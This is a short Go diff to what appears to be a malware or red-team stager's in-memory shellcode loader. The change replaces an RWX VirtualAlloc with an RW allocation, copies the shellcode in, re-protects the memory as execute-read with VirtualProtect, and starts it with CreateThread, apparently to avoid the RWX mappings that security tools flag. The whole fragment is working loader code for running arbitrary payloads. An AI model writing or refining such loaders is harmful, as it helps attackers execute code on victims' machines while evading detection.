@@ -38,14 +38,17 @@ func (s *Stager) stageWindows() error {
 	return executeInMemory(shellcode)
 }
 
-// executeInMemory allocates RWX memory, copies shellcode, and executes it
-// using VirtualAlloc + RtlMoveMemory + CreateThread via win/api.
+// executeInMemory allocates RW memory, copies shellcode, re-protects as
+// RX, then executes via CreateThread. The two-step allocation avoids
+// mapping memory as simultaneously writable and executable (RWX).
 func executeInMemory(shellcode []byte) error {
+	size := uintptr(len(shellcode))
+
 	addr, err := windows.VirtualAlloc(
 		0,
-		uintptr(len(shellcode)),
+		size,
 		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_EXECUTE_READWRITE,
+		windows.PAGE_READWRITE,
 	)
 	if err != nil {
 		return fmt.Errorf("VirtualAlloc failed: %w", err)
@@ -54,8 +57,13 @@ func executeInMemory(shellcode []byte) error {
 	_, _, _ = api.ProcRtlMoveMemory.Call(
 		addr,
 		uintptr(unsafe.Pointer(&shellcode[0])),
-		uintptr(len(shellcode)),
+		size,
 	)
+
+	var oldProtect uint32
+	if err := windows.VirtualProtect(addr, size, windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
+		return fmt.Errorf("VirtualProtect failed: %w", err)
+	}
 
 	thread, _, err := api.ProcCreateThread.Call(
 		0,
